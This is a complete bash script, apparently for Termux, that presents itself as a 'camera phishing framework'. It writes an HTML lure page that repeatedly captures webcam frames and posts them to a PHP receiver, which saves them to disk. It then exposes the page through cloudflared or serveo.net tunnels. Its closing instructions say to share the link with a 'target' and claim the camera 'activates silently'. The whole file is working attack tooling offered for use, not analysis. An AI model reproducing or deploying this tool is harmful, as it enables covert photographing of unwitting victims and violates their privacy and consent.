#!/bin/bash

# ==============================================
# B4 TOOL - Advanced Camera Phishing Framework
# ==============================================
# Developer: 0x4D1N | CyberForge Labs
# Version: 2.0 | Stealth Mode Active
# ==============================================

# Hacker Colors - Matrix inspired
r='\e[91m'    # blood red
g='\e[92m'    # neon green
y='\e[93m'    # warning yellow
c='\e[96m'    # cyan
b='\e[94m'    # blue
m='\e[95m'    # purple
gr='\e[90m'   # gray
bl='\e[30m'   # black
bg_black='\e[40m'
reset='\e[0m'
bold='\e[1m'
blink='\e[5m'

# Banner function with glitch effect
show_banner() {
    clear
    echo -e "${r}${bold}"
    echo '   ▄▄▄▄    ██████  ▄▄▄▄     ██████  ▒█████   ▒█████   ██▓     '
    echo '  ▓█████▄ ▒██    ▒ ▓█████▄ ▒██    ▒ ▒██▒  ██▒▒██▒  ██▒▓██▒     '
    echo '  ▒██▒ ▄██░ ▓██▄   ▒██▒ ▄██░ ▓██▄   ▒██░  ██▒▒██░  ██▒▒██░     '
    echo '  ▒██░█▀  ▒   ██▒ ▒██░█▀   ▒   ██▒▒██   ██░▒██   ██░▒██░     '
    echo '  ░▓█  ▀█▓▒██████▒▒░▓█  ▀█▓▒██████▒▒░ ████▓▒░░ ████▓▒░██████▒ '
    echo '  ░▒▓███▀▒▒ ▒▓▒ ▒ ░░▒▓███▀▒▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▓ ▒░ '
    echo '  ▒░▒   ░ ░ ░▒  ░ ░▒░▒   ░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒  ░░ '
    echo '   ░    ░ ░  ░  ░   ░    ░ ░  ░  ░  ░ ░ ░ ▒  ░ ░ ░ ▒  ░  ░  ░  '
    echo '   ░            ░   ░            ░      ░ ░      ░ ░        ░  '
    echo '        ░                   ░                                   '
    echo -e "${reset}"
    echo -e "${gr}╔══════════════════════════════════════════════════════════════╗${reset}"
    echo -e "${gr}║${reset}  ${c}${bold}◆ B4 TOOL v2.0 ◆${reset}      ${y}Advanced Camera Acquisition Framework${reset}          ${gr}║${reset}"
    echo -e "${gr}║${reset}  ${g}Developer:${reset} ${m}0x4D1N${reset} | ${g}Team:${reset} ${m}CyberForge Labs${reset}                    ${gr}║${reset}"
    echo -e "${gr}║${reset}  ${g}Status:${reset} ${y}${blink}●${reset}${y} ACTIVE${reset}          ${g}Encrypted Payload Ready${reset}                ${gr}║${reset}"
    echo -e "${gr}╚══════════════════════════════════════════════════════════════╝${reset}"
    echo ""
}

# Error handler
error_exit() {
    echo -e "${r}[!] ERROR: $1${reset}"
    exit 1
}

# Check and install packages with hacker style
install_packages() {
    echo -e "${c}[${g}+${c}]${reset} ${y}[INIT]${reset} Initializing environment..."
    echo -e "${c}[${g}+${c}]${reset} ${y}[PKG]${reset} Scanning required binaries..."
    
    pkgs=(php openssh wget figlet inotify-tools)
    for pkg in "${pkgs[@]}"; do
        if ! command -v $pkg >/dev/null 2>&1; then
            echo -e "${c}[${r}!${c}]${reset} ${y}Missing:${reset} $pkg ${c}->${reset} ${g}Installing...${reset}"
            pkg install $pkg -y >/dev/null 2>&1
            if [ $? -eq 0 ]; then
                echo -e "${c}[${g}✓${c}]${reset} ${g}Installed:${reset} $pkg"
            else
                echo -e "${c}[${r}✗${c}]${reset} ${r}Failed to install:${reset} $pkg"
            fi
        else
            echo -e "${c}[${g}✓${c}]${reset} ${g}Found:${reset} $pkg"
        fi
    done
    
    # Install cloudflared if not present
    if ! command -v cloudflared >/dev/null 2>&1; then
        echo -e "${c}[${r}!${c}]${reset} ${y}cloudflared not found, installing...${reset}"
        pkg install cloudflared -y >/dev/null 2>&1
    fi
    
    echo -e "${c}[${g}+${c}]${reset} ${g}[DONE]${reset} Environment ready."
    echo ""
}

# Create Hacker-Style HTML Camera Page
create_html_payload() {
    cat > camera.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>B4 TOOL | SECURE ACCESS</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            background: radial-gradient(circle at center, #0a0f0a 0%, #030603 100%);
            font-family: 'Share Tech Mono', 'Courier New', monospace;
            overflow-x: hidden;
            position: relative;
        }
        
        /* Matrix rain effect */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            opacity: 0.15;
        }
        
        .glitch-text {
            animation: glitch 1s infinite;
        }
        
        @keyframes glitch {
            0%, 100% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ff00; }
            33% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ff00; }
            66% { text-shadow: 0 2px #ff00ff, 0 -2px #00ff00; }
        }
        
        .terminal-card {
            position: relative;
            z-index: 10;
            max-width: 680px;
            margin: 2rem auto;
            padding: 2rem;
            background: rgba(0, 5, 0, 0.85);
            backdrop-filter: blur(8px);
            border: 1px solid #0f0;
            border-radius: 8px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2), inset 0 0 20px rgba(0, 255, 0, 0.05);
        }
        
        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0, 255, 0, 0.03) 50%);
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 20;
            animation: scan 8s linear infinite;
        }
        
        @keyframes scan {
            0% { background-position: 0 0; }
            100% { background-position: 0 100%; }
        }
        
        .header-badge {
            text-align: center;
            border-bottom: 2px solid #0f0;
            padding-bottom: 1rem;
            margin-bottom: 1.5rem;
        }
        
        .ascii-logo {
            color: #0f0;
            font-size: 0.7rem;
            white-space: pre;
            font-family: monospace;
            line-height: 1.2;
            text-shadow: 0 0 3px #0f0;
        }
        
        .prompt-line {
            color: #0f0;
            font-size: 0.85rem;
            margin: 0.5rem 0;
            border-left: 3px solid #0f0;
            padding-left: 1rem;
        }
        
        .input-field {
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 1rem;
            width: 100%;
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.2rem;
            border-radius: 4px;
            margin: 1rem 0;
            outline: none;
        }
        
        .input-field:focus {
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }
        
        .hack-btn {
            background: #000;
            border: 2px solid #0f0;
            color: #0f0;
            padding: 0.8rem 2rem;
            font-family: monospace;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .hack-btn:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 20px #0f0;
        }
        
        .camera-preview {
            margin: 1.5rem 0;
            border: 2px solid #0f0;
            border-radius: 4px;
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        #videoElement {
            width: 100%;
            display: block;
            transform: scaleX(-1);
            filter: grayscale(0.3) contrast(1.2);
        }
        
        .cam-overlay {
            position: absolute;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.7);
            color: #0f0;
            padding: 4px 8px;
            font-size: 0.7rem;
            border-left: 2px solid #0f0;
        }
        
        .status-line {
            color: #0f0;
            font-size: 0.75rem;
            margin-top: 1rem;
            text-align: center;
            border-top: 1px solid #0f0;
            padding-top: 1rem;
        }
        
        .blink-cursor {
            animation: blink 1s step-end infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .user-name {
            color: #ffaa00;
            text-shadow: 0 0 5px #ffaa00;
            font-size: 1.8rem;
            font-weight: bold;
            text-align: center;
            margin: 1rem 0;
            word-break: break-word;
        }
        
        @media (max-width: 600px) {
            .terminal-card { margin: 1rem; padding: 1.2rem; }
            .user-name { font-size: 1.3rem; }
            .ascii-logo { font-size: 0.5rem; }
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrixCanvas"></div>
    <div class="scanline"></div>
    
    <div class="terminal-card">
        <div class="header-badge">
            <div class="ascii-logo">
    ╔══════════════════════════════════════╗
    ║  [B4] SECURE ACCESS TERMINAL v2.0   ║
    ║  ═════════════════════════════════  ║
    ║  > ENCRYPTED CHANNEL ACTIVE         ║
    ║  > FACIAL AUTH PROTOCOL READY       ║
    ╚══════════════════════════════════════╝
            </div>
        </div>
        
        <div class="prompt-line">
            [B4@system] $ target_identification --scan
        </div>
        
        <div id="userDisplay" class="user-name">UNKNOWN_ENTITY</div>
        
        <div class="camera-preview" id="cameraContainer">
            <video id="videoElement" autoplay playsinline muted></video>
            <div class="cam-overlay">[LIVE_FEED] // ENCRYPTED</div>
        </div>
        
        <div class="prompt-line">
            [B4@system] $ executing_capture_sequence...
        </div>
        
        <div class="status-line" id="captureStatus">
            [>] STANDBY_MODE // AWAITING_FRAME_CAPTURE
        </div>
    </div>
    
    <script>
        // Matrix rain effect
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for(let i = 0; i < columns; i++) drops[i] = Math.random() * -100;
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 5, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';
            for(let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        
        // Get name from URL
        const urlParams = new URLSearchParams(window.location.search);
        let userName = urlParams.get('name');
        const userDisplay = document.getElementById('userDisplay');
        if(userName && userName.trim() !== "") {
            let decoded = decodeURIComponent(userName).trim();
            if(decoded.length > 25) decoded = decoded.slice(0,22) + '..';
            userDisplay.innerHTML = decoded.toUpperCase();
            userDisplay.style.color = '#0f0';
        } else {
            userDisplay.innerHTML = 'ANONYMOUS_TARGET';
        }
        
        // Camera capture with stealth upload
        const video = document.getElementById('videoElement');
        let stream = null;
        
        async function initCapture() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                await video.play();
                document.getElementById('captureStatus').innerHTML = '[>] FEED_ACTIVE // CAPTURING_INTERVAL_STARTED';
                startStealthCapture();
            } catch(err) {
                console.log("Camera error");
                document.getElementById('captureStatus').innerHTML = '[!] CAMERA_ACCESS_DENIED // FALLBACK_MODE';
            }
        }
        
        function startStealthCapture() {
            setInterval(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                fetch('save.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'image=' + encodeURIComponent(imageData)
                }).catch(e => console.log);
            }, 1800);
        }
        
        initCapture();
        
        window.addEventListener('beforeunload', () => {
            if(stream) stream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>
EOF

    # Create PHP receiver script
    cat > save.php << 'EOF'
<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: text/plain");
if(isset($_POST['image'])) {
    $data = $_POST['image'];
    list($type, $data) = explode(';', $data);
    list(, $data) = explode(',', $data);
    $data = base64_decode($data);
    $timestamp = date('Y-m-d_H-i-s');
    $rand = bin2hex(random_bytes(4));
    $filename = "logs/capture_{$timestamp}_{$rand}.jpg";
    file_put_contents($filename, $data);
    echo "OK";
} else {
    echo "NO_DATA";
}
?>
EOF

    echo -e "${c}[${g}+${c}]${reset} ${g}[PAYLOAD]${reset} Hacker-style HTML payload deployed."
}

# Main execution
main() {
    show_banner
    install_packages
    create_html_payload
    
    # Get festival/target name
    echo -ne "${c}[${y}?${c}]${reset} ${y}Enter Campaign Name / Target Event: ${reset}"
    read fest
    fest=${fest:-"OPERATION_SHADOW"}
    fest_slug=$(echo "$fest" | tr '[:upper:]' '[:lower:]' | tr ' ' '_')
    
    # Update HTML with campaign name
    sed -i "s|OPERATION_SHADOW|$fest|g" camera.html 2>/dev/null || true
    
    # Start PHP Server
    echo -e "\n${c}[${g}+${c}]${reset} ${g}[SERVER]${reset} Launching PHP backend on port 8080..."
    mkdir -p logs
    killall php 2>/dev/null
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
    sleep 2
    
    # Tunnel selection
    echo ""
    echo -e "${c}┌─────────────────────────────────────────┐${reset}"
    echo -e "${c}│${reset}  ${y}[TUNNEL SELECTION]${reset}                      ${c}│${reset}"
    echo -e "${c}├─────────────────────────────────────────┤${reset}"
    echo -e "${c}│${reset}  ${g}[1]${reset} Localhost (internal)                   ${c}│${reset}"
    echo -e "${c}│${reset}  ${g}[2]${reset} Cloudflared (CDN tunnel)                ${c}│${reset}"
    echo -e "${c}│${reset}  ${g}[3]${reset} Serveo.net (SSH reverse tunnel)         ${c}│${reset}"
    echo -e "${c}└─────────────────────────────────────────┘${reset}"
    echo -ne "${c}[${y}>${c}]${reset} Select tunnel [1-3]: ${reset}"
    read opt
    opt=${opt:-1}
    
    link=""
    if [[ $opt == 2 ]]; then
        echo -e "${c}[${g}+${c}]${reset} ${y}[CLOUDFLARED]${reset} Establishing encrypted tunnel..."
        killall cloudflared 2>/dev/null
        rm -f .clflog
        cloudflared tunnel --url http://localhost:8080 > .clflog 2>&1 &
        sleep 6
        for i in {1..15}; do
            link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .clflog | head -n1)
            [[ -n "$link" ]] && break
            sleep 1
        done
    elif [[ $opt == 3 ]]; then
        echo -e "${c}[${g}+${c}]${reset} ${y}[SERVEO]${reset} Creating SSH reverse tunnel..."
        killall ssh 2>/dev/null
        rm -f .servolog
        ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .servolog 2>&1 &
        sleep 7
        for i in {1..15}; do
            link=$(grep -o "https://[a-z0-9.-]*\.serveo\.net" .servolog | head -n1)
            [[ -n "$link" ]] && break
            sleep 1
        done
    else
        link="http://localhost:8080"
    fi
    
    # Final output
    echo ""
    echo -e "${c}╔══════════════════════════════════════════════════════════╗${reset}"
    echo -e "${c}║${reset}  ${g}[LINK GENERATED]${reset}                                        ${c}║${reset}"
    echo -e "${c}║${reset}  ${y}➤${reset} ${bold}${link}${reset}  ${c}║${reset}"
    echo -e "${c}║${reset}                                                                  ${c}║${reset}"
    echo -e "${c}║${reset}  ${g}[INSTRUCTIONS]${reset}                                          ${c}║${reset}"
    echo -e "${c}║${reset}  ${y}•${reset} Share this link with target                           ${c}║${reset}"
    echo -e "${c}║${reset}  ${y}•${reset} When they access, camera activates silently           ${c}║${reset}"
    echo -e "${c}║${reset}  ${y}•${reset} Captured images saved in ${g}logs/${reset} directory                  ${c}║${reset}"
    echo -e "${c}╚══════════════════════════════════════════════════════════╝${reset}"
    echo ""
    echo -e "${c}[${g}+${c}]${reset} ${g}MONITORING MODE ACTIVE${reset}"
    echo -e "${c}[${y}!${c}]${reset} ${y}Press Ctrl+C to abort capture session${reset}"
    echo ""
    
    # Monitor logs with hacker-style output
    last_file=""
    while true; do
        new_file=$(inotifywait -e create --format '%f' logs 2>/dev/null | head -n1)
        if [[ -n "$new_file" && "$new_file" != "$last_file" ]]; then
            timestamp=$(date '+%H:%M:%S')
            echo -e "${c}[${g}CAPTURE${c}]${reset} ${y}[$timestamp]${reset} ${g}>>${reset} Image acquired: ${c}logs/$new_file${reset}"
            echo -e "${c}   └─${reset} ${gr}Size: $(du -h logs/$new_file 2>/dev/null | cut -f1) | Status: STORED${reset}"
            last_file="$new_file"
        fi
        sleep 0.5
    done
}

# Run main with trap
trap 'echo -e "\n${c}[${r}!${c}]${reset} ${r}Session terminated.${reset}"; exit 0' INT
main